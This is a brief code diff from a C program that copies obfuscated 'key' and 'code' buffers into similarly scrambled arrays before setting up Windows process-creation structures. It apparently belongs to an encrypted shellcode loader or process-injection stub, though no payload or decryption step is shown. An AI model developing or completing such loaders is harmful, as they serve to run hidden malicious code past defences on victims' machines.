@@ -44,8 +44,8 @@ int main() {
     unsigned char karic0d2[code199kLen];
 
    
-    memcpy(karik12y, kkeyakesey, kkeyakeseyLen);
-    memcpy(karic0d2, kkcode, kkcodeLen);
+    memcpy(karik12y, code199k, code199kLen);
+    memcpy(karic0d2, key101k, key101kLen);
     
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
